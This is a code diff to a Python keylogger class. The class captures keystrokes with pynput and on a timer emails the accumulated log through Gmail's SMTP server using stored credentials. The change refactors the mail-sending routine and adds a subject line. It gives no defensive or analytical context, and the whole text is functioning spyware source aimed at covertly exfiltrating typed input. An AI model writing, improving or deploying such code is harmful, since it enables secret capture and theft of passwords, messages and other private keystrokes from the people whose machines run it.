@@ -3,12 +3,11 @@ import pynput.keyboard
 import threading
 import smtplib
 
-
 class Keylogger:
     def __init__(self, time_interval, email, password):
         self.log = "Keylogger Started"
         self.interval = time_interval
-        self.email = email
+        self.email = email  # this will be used both as the sender and recipient
         self.password = password
 
     # Keeps log of key strokes 
@@ -28,17 +27,19 @@ class Keylogger:
 
     # Defines the reporting of keylogged data to email feature
     def report(self):
-        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.send_email("\n\n" + self.log)
         self.log = ""
         timer = threading.Timer(self.interval , self.report)
         timer.start()
 
-    # Sets up emailing functionality
-    def send_mail(self, email, password, message):
+    # Sets up emailing functionality using the updated format
+    def send_email(self, message):
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, message)
+        server.login(self.email, self.password)  # use the credentials provided during initialization
+        subject = "Key Logger Message"
+        full_message = 'Subject: {}\n\n{}'.format(subject, message)
+        server.sendmail(self.email, self.email, full_message)  # using the provided email as both sender and recipient
         server.quit()
 
     # Starts the keylogger
